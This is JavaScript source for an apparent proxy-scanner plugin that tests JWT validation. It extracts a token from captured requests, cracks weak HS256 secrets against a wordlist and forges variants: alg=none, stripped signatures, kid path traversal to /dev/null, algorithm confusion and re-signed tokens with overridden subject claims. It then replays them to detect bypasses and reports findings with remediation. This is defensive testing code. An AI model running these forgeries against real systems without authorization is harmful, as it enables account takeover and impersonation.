(function () {
  "use strict";
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  function decode64(value) {
    var output = "", buffer = 0, bits = 0;
    String(value || "").replace(/-/g, "+").replace(/_/g, "/").replace(/=+$/, "").split("").forEach(function (character) {
      var index = alphabet.indexOf(character); if (index < 0) return;
      buffer = (buffer << 6) | index; bits += 6;
      if (bits >= 8) { bits -= 8; output += String.fromCharCode((buffer >> bits) & 255); }
    });
    return output;
  }
  function encode64(value) {
    var output = "", index, buffer;
    for (index = 0; index < value.length; index += 3) {
      buffer = value.charCodeAt(index) << 16;
      if (index + 1 < value.length) buffer |= value.charCodeAt(index + 1) << 8;
      if (index + 2 < value.length) buffer |= value.charCodeAt(index + 2);
      output += alphabet[(buffer >> 18) & 63] + alphabet[(buffer >> 12) & 63];
      output += index + 1 < value.length ? alphabet[(buffer >> 6) & 63] : "=";
      output += index + 2 < value.length ? alphabet[buffer & 63] : "=";
    }
    return output;
  }
  function urlEncode(value) { return encode64(value).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, ""); }
  function bytes(value) {
    var encoded = unescape(encodeURIComponent(String(value))), output = [];
    for (var index = 0; index < encoded.length; index += 1) output.push(encoded.charCodeAt(index) & 255);
    return output;
  }
  function rotate(value, amount) { return (value >>> amount) | (value << (32 - amount)); }
  function sha256(input) {
    var constants = [1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298];
    var data = input.slice(), bitLength = data.length * 8, words = [], hash = [1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225];
    data.push(128); while (data.length % 64 !== 56) data.push(0);
    for (var pad = 7; pad >= 0; pad -= 1) data.push(pad >= 4 ? 0 : (bitLength >>> (pad * 8)) & 255);
    for (var offset = 0; offset < data.length; offset += 64) {
      for (var index = 0; index < 16; index += 1) words[index] = ((data[offset+index*4]<<24)|(data[offset+index*4+1]<<16)|(data[offset+index*4+2]<<8)|data[offset+index*4+3])|0;
      for (index = 16; index < 64; index += 1) { var x=words[index-15], y=words[index-2]; words[index]=(words[index-16]+(rotate(x,7)^rotate(x,18)^(x>>>3))+words[index-7]+(rotate(y,17)^rotate(y,19)^(y>>>10)))|0; }
      var a=hash[0],b=hash[1],c=hash[2],d=hash[3],e=hash[4],f=hash[5],g=hash[6],h=hash[7];
      for (index=0; index<64; index+=1) { var s1=rotate(e,6)^rotate(e,11)^rotate(e,25), ch=(e&f)^(~e&g), t1=(h+s1+ch+constants[index]+words[index])|0, s0=rotate(a,2)^rotate(a,13)^rotate(a,22), maj=(a&b)^(a&c)^(b&c), t2=(s0+maj)|0; h=g;g=f;f=e;e=(d+t1)|0;d=c;c=b;b=a;a=(t1+t2)|0; }
      hash[0]=(hash[0]+a)|0;hash[1]=(hash[1]+b)|0;hash[2]=(hash[2]+c)|0;hash[3]=(hash[3]+d)|0;hash[4]=(hash[4]+e)|0;hash[5]=(hash[5]+f)|0;hash[6]=(hash[6]+g)|0;hash[7]=(hash[7]+h)|0;
    }
    var output=[]; hash.forEach(function(word){ for(var shift=24;shift>=0;shift-=8) output.push((word>>>shift)&255); }); return output;
  }
  function hmac256(secret, message) {
    var key=bytes(secret); if(key.length>64) key=sha256(key); while(key.length<64) key.push(0);
    var inner=[],outer=[]; for(var i=0;i<64;i+=1){inner.push(key[i]^54);outer.push(key[i]^92);} return sha256(outer.concat(sha256(inner.concat(bytes(message)))));
  }
  function bytes64url(value) { return urlEncode(String.fromCharCode.apply(null, value)); }
  function sign256(headerPart, payloadPart, secret) { return bytes64url(hmac256(secret, headerPart + "." + payloadPart)); }
  function headerValues(context) {
    var values = [];
    if (!context.base_exchange || !context.base_exchange.identity) throw new Error("JWTAnalyzer requires identity.use access to a saved request");
    (context.base_exchange.identity.request_headers || []).forEach(function (entry) {
      values.push({ name: String(entry.name), value: decode64(entry.value_base64) });
    });
    return values;
  }
  function tokenContext(input, context) {
    var explicit = String(input.token || "");
    if (explicit.split(".").length === 3) return { token: explicit, kind: "explicit", name: "Authorization" };
    var found = null;
    headerValues(context).some(function (header) {
      if (/^authorization$/i.test(header.name)) {
        var match = header.value.match(/Bearer\s+([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)/i);
        if (match) { found = { token: match[1], kind: "authorization", name: header.name }; return true; }
      }
      if (/^cookie$/i.test(header.name)) {
        return header.value.split(";").some(function (item) {
          var split = item.trim().indexOf("="); if (split < 1) return false;
          var name = item.trim().slice(0, split), value = item.trim().slice(split + 1);
          if (value.split(".").length === 3) { found = { token: value, kind: "cookie", name: name }; return true; }
          return false;
        });
      }
      return false;
    });
    if (!found) throw new Error("no JWT found in Authorization or Cookie headers; provide input.token explicitly");
    return found;
  }
  function parsed(input, context) {
    var located = tokenContext(input, context), pieces = located.token.split("."), header, payload;
    try { header = JSON.parse(decode64(pieces[0])); payload = JSON.parse(decode64(pieces[1])); }
    catch (_) { throw new Error("JWT header and payload must be valid base64url JSON"); }
    return { located: located, pieces: pieces, header: header, payload: payload };
  }
  function token(header, payload, signature) { return urlEncode(JSON.stringify(header)) + "." + urlEncode(JSON.stringify(payload)) + "." + signature; }
  function secretCandidates(input, context) {
    var values = [], seen = {};
    function add(value) { value=String(value||""); if(value.length<=256 && !seen[value] && values.length<Math.max(1,Math.min(Number(input.max_secrets||2000),5000))){seen[value]=true;values.push(value);} }
    (input.hmac_secrets || []).forEach(add);
    if (context.resources && typeof context.resources["hmac-secrets"] === "string") context.resources["hmac-secrets"].split(/\r?\n/).forEach(add);
    return values;
  }
  function weakSecret(input, context, jwt) {
    if (String(jwt.header.alg || "").toUpperCase() !== "HS256") return null;
    var found=null;
    secretCandidates(input, context).some(function(secret){ if(sign256(jwt.pieces[0],jwt.pieces[1],secret)===jwt.pieces[2]){found=secret;return true;} return false; });
    return found;
  }
  function signedToken(header, payload, secret) {
    var headerPart=urlEncode(JSON.stringify(header)), payloadPart=urlEncode(JSON.stringify(payload));
    return headerPart+"."+payloadPart+"."+sign256(headerPart,payloadPart,secret);
  }
  function variants(input, context) {
    var jwt = parsed(input, context), list = [], signature = jwt.pieces[2], enabled = input.tests || ["none", "invalid_signature", "missing_signature", "expired", "no_exp", "weak_hmac", "kid_path"];
    function add(name, header, payload, sig) { if (enabled.indexOf(name) !== -1) list.push({ name: name, token: token(header, payload, sig) }); }
    add("none", Object.assign({}, jwt.header, { alg: "none" }), jwt.payload, "");
    if (enabled.indexOf("invalid_signature") !== -1) list.push({ name: "invalid_signature", token: jwt.pieces[0] + "." + jwt.pieces[1] + "." + (signature ? signature.slice(0, -1) + (signature.slice(-1) === "A" ? "B" : "A") : "A") });
    if (enabled.indexOf("missing_signature") !== -1) list.push({ name: "missing_signature", token: jwt.pieces[0] + "." + jwt.pieces[1] + "." });
    var secret=weakSecret(input,context,jwt), canResign=secret!==null && String(jwt.header.alg||"").toUpperCase()==="HS256";
    if(enabled.indexOf("expired")!==-1) {
      var expiredPayload=Object.assign({},jwt.payload,{exp:1});
      list.push({name:"expired",token:canResign?signedToken(jwt.header,expiredPayload,secret):token(jwt.header,expiredPayload,signature)});
    }
    if(enabled.indexOf("no_exp")!==-1) {
      var noExp=Object.assign({},jwt.payload); delete noExp.exp;
      list.push({name:"no_exp",token:canResign?signedToken(jwt.header,noExp,secret):token(jwt.header,noExp,signature)});
    }
    add("empty_hmac", Object.assign({}, jwt.header, { alg: "HS256" }), jwt.payload, "");
    if (enabled.indexOf("kid_path") !== -1) {
      var kidHeader=Object.assign({},jwt.header,{alg:"HS256",kid:"../../../../dev/null"}), kidHeaderPart=urlEncode(JSON.stringify(kidHeader)), kidPayloadPart=urlEncode(JSON.stringify(jwt.payload));
      list.push({name:"kid_path",token:kidHeaderPart+"."+kidPayloadPart+"."+sign256(kidHeaderPart,kidPayloadPart,"")});
    }
    var claimOverrides=Object.assign({},input.claim_overrides||{});
    if(input.target_subject) claimOverrides.sub=String(input.target_subject);
    if(secret && enabled.indexOf("weak_hmac")!==-1 && Object.keys(claimOverrides).length){
      var weakHeader=Object.assign({},jwt.header,{alg:"HS256"}), weakPayload=Object.assign({},jwt.payload,claimOverrides);
      list.push({name:"weak_hmac",token:signedToken(weakHeader,weakPayload,secret)});
    }
    if(input.server_public_key && enabled.indexOf("algorithm_confusion")!==-1){
      var confusionHeader=Object.assign({},jwt.header,{alg:"HS256"}), confusionPayload=Object.assign({},jwt.payload,claimOverrides);
      list.push({name:"algorithm_confusion",token:signedToken(confusionHeader,confusionPayload,String(input.server_public_key))});
    }
    if (input.prebuilt_tokens) ["embedded_jwk","jku","x5u"].forEach(function(name){ if(enabled.indexOf(name)!==-1 && typeof input.prebuilt_tokens[name]==="string" && input.prebuilt_tokens[name].split(".").length===3) list.push({name:name,token:input.prebuilt_tokens[name]}); });
    return list.slice(0, 20);
  }
  function operation(id, baseId, located, replacement, targetUrl) {
    var op = { id: id, type: "http_request", base_exchange_id: baseId, protocol: "auto" };
    if (targetUrl) op.url = String(targetUrl);
    if (located.kind === "cookie") op.cookie_params = [{ name: located.name, value: replacement }];
    else op.headers = [{ name: located.name, value: "Bearer " + replacement }];
    return op;
  }
  function plan(input, context) {
    var jwt = parsed(input, context), operations = [], targetUrl = input.target_url || null;
    if (input.active !== false) {
      for (var repeat = 0; repeat < 2; repeat += 1) operations.push(operation("baseline-" + repeat, context.base_exchange.exchange_id, jwt.located, jwt.located.token, targetUrl));
      variants(input, context).forEach(function (variant, index) { for (var repeat = 0; repeat < 2; repeat += 1) operations.push(operation("variant-" + index + "-" + repeat, context.base_exchange.exchange_id, jwt.located, variant.token, targetUrl)); });
    }
    return { operations: operations, result: { token_location: jwt.located.kind, algorithm: jwt.header.alg || null, weak_hmac_secret_found: !!weakSecret(input, context, jwt), active_variants: input.active === false ? [] : variants(input, context).map(function (item) { return item.name; }), target_url: targetUrl, explicit_success_oracle: !!input.success } };
  }
  function byId(items) { var out = {}; items.forEach(function (item) { out[item.id] = item; }); return out; }
  function responseText(item) { return item && item.response_body_base64 ? decode64(item.response_body_base64) : String(item && item.response_preview && item.response_preview.text || ""); }
  function normalized(item, input) {
    var output=responseText(item).toLowerCase()
      .replace(/(<input\b[^>]*\bname=["']?(?:csrf|csrf_token|_csrf|xsrf|_token|authenticity_token)["']?[^>]*\bvalue=)["'][^"']*["']/gi,"$1\"<volatile>\"")
      .replace(/(["'](?:csrf|csrf_token|nonce|request_id|trace_id)["']\s*[:=]\s*)["'][^"']+["']/gi,"$1\"<volatile>\"")
      .replace(/\b[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\b/gi,"<uuid>")
      .replace(/\s+/g," ").trim();
    (input.ignore_patterns||[]).forEach(function(pattern){try{output=output.replace(new RegExp(String(pattern),"gi"),"<ignored>");}catch(_){}}); return output;
  }
  function similarity(left,right){if(left===right)return 1;if(!left||!right)return 0;var a={},b={},u={},same=0,total=0;left.split(/[^a-z0-9_]+/).filter(Boolean).forEach(function(t){a[t]=1;u[t]=1;});right.split(/[^a-z0-9_]+/).filter(Boolean).forEach(function(t){b[t]=1;u[t]=1;});Object.keys(u).forEach(function(t){total+=1;if(a[t]&&b[t])same+=1;});return total?same/total:0;}
  function same(a, b, input) { return !!(a && b && !a.error && !b.error && a.status_code === b.status_code && similarity(normalized(a,input),normalized(b,input)) >= Math.max(0.5,Math.min(Number(input.similarity_threshold==null?0.92:input.similarity_threshold),1))); }
  function pair(map, prefix, input) { return same(map[prefix + "0"], map[prefix + "1"], input) ? map[prefix + "0"] : null; }
  function responseHeaders(item, name) {
    var output=[];
    (item && item.response_headers || []).forEach(function(header){
      if(String(header.name||"").toLowerCase()===String(name).toLowerCase()) output.push(header.value_base64 != null ? decode64(header.value_base64) : String(header.value||""));
    });
    return output;
  }
  function textMatches(value, predicate) {
    value=String(value||""); predicate=predicate||{};
    if(predicate.equals != null && value!==String(predicate.equals)) return false;
    if(predicate.contains != null && value.indexOf(String(predicate.contains))===-1) return false;
    if(predicate.regex != null) { try { if(!(new RegExp(String(predicate.regex))).test(value)) return false; } catch(_) { return false; } }
    return true;
  }
  function pointer(value, path) {
    if(path==="" || path==="$" || path==="/") return {exists:true,value:value};
    if(String(path).charAt(0)!=="/") return {exists:false};
    var current=value, pieces=String(path).slice(1).split("/").map(function(part){return part.replace(/~1/g,"/").replace(/~0/g,"~");});
    for(var index=0;index<pieces.length;index+=1){if(current==null || !Object.prototype.hasOwnProperty.call(Object(current),pieces[index])) return {exists:false}; current=current[pieces[index]];}
    return {exists:true,value:current};
  }
  function successMatches(item, predicate) {
    if(!item || item.error || !predicate) return false;
    if(predicate.status_codes && predicate.status_codes.length && predicate.status_codes.indexOf(Number(item.status_code))===-1) return false;
    if(predicate.body_contains != null && responseText(item).indexOf(String(predicate.body_contains))===-1) return false;
    if(predicate.body_regex != null) { try { if(!(new RegExp(String(predicate.body_regex))).test(responseText(item))) return false; } catch(_) { return false; } }
    if(predicate.headers && !predicate.headers.every(function(expected){return responseHeaders(item,expected.name).some(function(value){return textMatches(value,expected);});})) return false;
    if(predicate.redirect_location && !responseHeaders(item,"location").some(function(value){return textMatches(value,predicate.redirect_location);})) return false;
    if(predicate.json) {
      var parsedBody; try { parsedBody=JSON.parse(responseText(item)); } catch(_) { return false; }
      if(!predicate.json.every(function(expected){var found=pointer(parsedBody,expected.pointer); if(expected.exists != null && found.exists!==expected.exists) return false; return expected.equals === undefined || (found.exists && JSON.stringify(found.value)===JSON.stringify(expected.equals));})) return false;
    }
    return true;
  }
  function analyze(input, observations, context) {
    var jwt = parsed(input, context), map = byId(observations), findings = [], baseId = context.base_exchange.exchange_id, now = Math.floor(Date.now() / 1000);
    function passive(title, severity, explanation) { findings.push({ title: title, severity: severity, confidence: "firm", explanation: explanation, remediation: "Issue short-lived tokens with explicit validation policy and verify algorithm, signature, claims, and trusted key sources server-side.", evidence_exchange_ids: [baseId] }); }
    if (String(jwt.header.alg || "").toLowerCase() === "none") passive("JWT uses the none algorithm", "high", "The captured token declares alg=none and therefore carries no cryptographic authentication.");
    if (jwt.payload.exp === undefined) passive("JWT has no expiration claim", "low", "The captured token does not contain an exp claim.");
    else if (Number(jwt.payload.exp) < now) passive("Captured JWT is expired", "informational", "The captured token expiration is in the past; acceptance would indicate missing claim validation.");
    if (jwt.header.jku || jwt.header.x5u) passive("JWT references a remote key URL", "medium", "The token header selects verification material through a URL and requires a strict allowlist.");
    if (weakSecret(input, context, jwt) !== null) passive("JWT is signed with a weak HMAC secret", "high", "The captured HS256 signature was verified using the bounded configured weak-secret dictionary.");
    var baseline = pair(map, "baseline-", input), explicitOracle=!!input.success;
    if (input.active !== false && baseline) variants(input, context).forEach(function (variant, index) {
      var accepted = pair(map, "variant-" + index + "-", input);
      var oracleAccepted = explicitOracle && accepted && successMatches(map["variant-"+index+"-0"],input.success) && successMatches(map["variant-"+index+"-1"],input.success);
      var negativeControl = explicitOracle && !successMatches(map["baseline-0"],input.success) && !successMatches(map["baseline-1"],input.success);
      if (accepted && ((explicitOracle && oracleAccepted && negativeControl) || (!explicitOracle && accepted.status_code >= 200 && accepted.status_code < 400 && same(baseline, accepted, input)))) findings.push({
        title: "JWT validation bypass using " + variant.name.replace(/_/g, " "), severity: "high", confidence: "firm",
        explanation: explicitOracle ? "A specialist JWT mutation matched the explicit success oracle twice while the repeated original-token controls did not." : "A deliberately invalid JWT mutation reproduced the authenticated baseline response twice.",
        remediation: "Reject altered tokens and enforce an allowlisted algorithm, valid signature, expiration, and trusted key-selection metadata.",
        evidence_exchange_ids: [baseline.exchange_id, accepted.exchange_id].filter(Boolean), metadata: { variant: variant.name, explicit_success_oracle: explicitOracle }
      });
    });
    return { findings: findings, result: { algorithm: jwt.header.alg || null, claims: Object.keys(jwt.payload).sort(), tested_operations: observations.length, target_url: input.target_url || null, explicit_success_oracle: explicitOracle, negative_control_rejected: explicitOracle && !!baseline && !successMatches(map["baseline-0"],input.success) && !successMatches(map["baseline-1"],input.success) } };
  }
  globalThis.HuntProxyPlugin = { plan: plan, analyze: analyze };
}());
